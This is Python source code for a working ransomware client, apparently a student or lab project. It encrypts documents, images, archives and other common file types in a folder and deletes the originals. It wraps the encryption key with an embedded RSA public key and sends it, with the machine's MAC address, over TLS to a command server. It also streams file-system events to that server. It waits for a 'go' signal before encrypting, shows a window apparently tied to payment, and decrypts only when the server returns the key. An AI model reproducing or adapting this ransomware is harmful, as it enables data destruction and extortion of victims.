
import os
from pathlib import Path
from cryptography.fernet import Fernet
import socket
import select
import ssl
import sys
from threading import *
import uuid
from interface import App
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import time
import psutil
from watchdog.observers import Observer
from watchdog.events import PatternMatchingEventHandler

'''
    Function to recursively scan a directory and give a list of filepaths
    baseDir: the starting directory to begin searching from
'''
def recursiveScan(baseDir):
    # scan current directory
    for entry in os.scandir(baseDir):
        if entry.is_file():
            # is file
            yield entry
        else:
            # if folder, start a new scan of contents
            yield from recursiveScan(entry.path)

'''
    Function to encrypt a specific file
    file: filepath to be encrypted
    key: key to use for encrypting
'''
def encrypt(file, key):
    # generating a fernet key
    f = Fernet(key)

    # get the data from the file
    with open(file, 'rb') as fl:
        original = fl.read()
    
    # encrypt the data
    encrypted = f.encrypt(original)

    # generate a custom, .imin file
    filename = str(file) + '.imin'
    encFile = Path(filename)
    
    # write to a new file with the new extension
    with open(encFile, 'wb+') as fl:
        fl.write(encrypted)

    # remove the old file
    os.remove(file)

'''
    Function to decrypt a specific file
    file: filepath to be decrypted
    key: key to use for decrypting
'''
def decrypt(file, key):
    # generate a fernet key
    f = Fernet(key)

    # get the data from the file
    with open(file, 'rb') as fl:
        encrypted = fl.read()
    
    # decrypt the data
    decrypted = f.decrypt(encrypted)

    # remove the .imin extension from new filename
    filename = str(file).split('.imin')[0]
    decFile = Path(filename)

    # write to the new, decrypted file
    with open(decFile, 'wb+') as fl:
        fl.write(decrypted)
    
    # remove the old, encrypted file
    os.remove(file)

'''
    Function to call encrypt on all files in the given directory
    key : key to use in encryption
'''
def encryptFiles(key):
    # list of filetypes to avoid when encrypting
    #exclude = ['.py','.pem', '.exe', '.imin']
    include = ['.pdf','.txt','.docx','.xlsx','.ppm','.tar','.zip','.jpeg','.mp4','.jar','.png','.gif']
    # loop through our filesystem
    for item in recursiveScan(os.path.join(os.getcwd(), 'Test')): 
        # generate the path
        filePath = Path(item)
        extension = filePath.suffix.lower()


        #if extension in exclude:
        #    continue
        # if the file isn't one of the exclude filetypes, encrypt it
        #if file is in include filetypes, encrypt it
        if extension in include:
            encrypt(filePath, key)
       
'''
    Function to call decrypt on all files in the given directory
    key : key to use in decryption
'''
def decryptFiles(key):
    # Loop through the filesystem
    for item in recursiveScan(os.path.join(os.getcwd(), 'Test')): 
        # make filepath
        filePath = Path(item)
        extension = filePath.suffix.lower()

        # decrypt if file has been encrypted before
        if extension == '.imin':
            decrypt(filePath, key)

def on_created(event):
     opt = f"{event.src_path} create"
     io = psutil.disk_io_counters(perdisk=False)
     timestamp = time.time()
     secSock.send(bytes("timestamp= " + str(timestamp) + " " + str(opt) + " " + str(io) , "utf-8"))

def on_deleted(event):
     opt = f"{event.src_path} delete"
     io = psutil.disk_io_counters(perdisk=False)
     timestamp = time.time()
     secSock.send(bytes("timestamp= " + str(timestamp) + " " + str(opt) + " " + str(io) , "utf-8"))
 
def on_modified(event):
     opt = f"{event.src_path} modify"
     io = psutil.disk_io_counters(perdisk=False)
     timestamp = time.time()
     secSock.send(bytes("timestamp= " + str(timestamp) + " " + str(opt) + " " + str(io) , "utf-8"))
 
def on_moved(event):
     opt = f"{event.src_path} move"
     io = psutil.disk_io_counters(perdisk=False)
     timestamp = time.time()
     secSock.send(bytes("timestamp= " + str(timestamp) + " " + str(opt) + " " + str(io) , "utf-8"))



if __name__ == "__main__":
    # using MAC address as an ID for the server
    MESSAGE = hex(uuid.getnode())
   
    patterns = ["*"]
    ignore_patterns = None
    ignore_directories = False
    case_sensitive = True
    my_event_handler = PatternMatchingEventHandler(patterns, ignore_patterns, ignore_directories, case_sensitive)
    
    my_event_handler.on_created = on_created
    my_event_handler.on_deleted = on_deleted
    my_event_handler.on_modified = on_modified
    my_event_handler.on_moved = on_moved

    path = "Test"
    go_recursively = True
    my_observer = Observer()
    my_observer.schedule(my_event_handler, path, recursive=go_recursively)

    my_observer.start()

    # hardcoded IP and Port
    HOST = 'localhost'
    PORT = 5789

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.load_verify_locations(os.path.join("crypto", "cert.pem"))

    # generate fernet key
    key = Fernet.generate_key()

    pubKey = RSA.import_key(b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3O2lkNYVKaUsOvEbXUoN\nJGJqBOmOMhaGsnvxhp0y4kFoY6gVDUpXtfcLejVEeaHttvudCUIN04ll1CLsuhlW\nShBSYC/H/zq0As07Ura4PEyzldZmoFBaQcsZMh3oZbypk8avwrHLJDHCMusWJlB2\ndj1VRwdnrd4/kSAQLDBXHvVsfcb2jIOKITHIj45GTb2yNCTk5af46gK3loMksxQx\nBdhjtbhXCaDpjaUIZtW41tALssh2sZOdY8M+qd2eL8cJ+lZGpTsU8/r9S90JLxnx\nxbzQdkP8AsEH01HRhYVtMzEzMB3qdkoqfl2KLMzGrXj9oIZrWUI2riMBd+wSIBx7\nPwIDAQAB\n-----END PUBLIC KEY-----')
    encryptor = PKCS1_OAEP.new(pubKey)
    encrypted = encryptor.encrypt(key)

    encrypted = int.from_bytes(encrypted, "little")

    PACKAGE = MESSAGE + " " + str(encrypted)

    # set up our socket to connect to the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    print('hello')
    try:
        secSock = context.wrap_socket(s, server_hostname="pwnd")
        secSock.connect((HOST, PORT))
    except Exception as e:
        print(e)
    print('Connected!')
    secSock.send(bytes(PACKAGE, "utf-8"))


    while True:
        read_sockets, write_sockets, error_sockets = select.select([secSock], [], [])

        # key = encrypt
        # wait = decrypt
        for sock in read_sockets:
            if sock == secSock:
                data = secSock.recv(4096)
                if not data:
                    sys.exit()
                else:
                    ''' 
                    if we recieve a 'wait', this means we have already encrypted
                    and should just wait until payment is complete
                    '''
                    if data.decode() == 'go':
                        print("encrypting")
                        encryptFiles(key)
                    #set up thread for tkinter window
                    visual = App(secSock)

                    # recv waits for new input of key to decrypt
                    key = secSock.recv(4096)
                    # upon receiving a key from the server, proceed to decrypt files
                    decryptFiles(key)

                    print("Files have been decrypted.")
                    sys.exit()
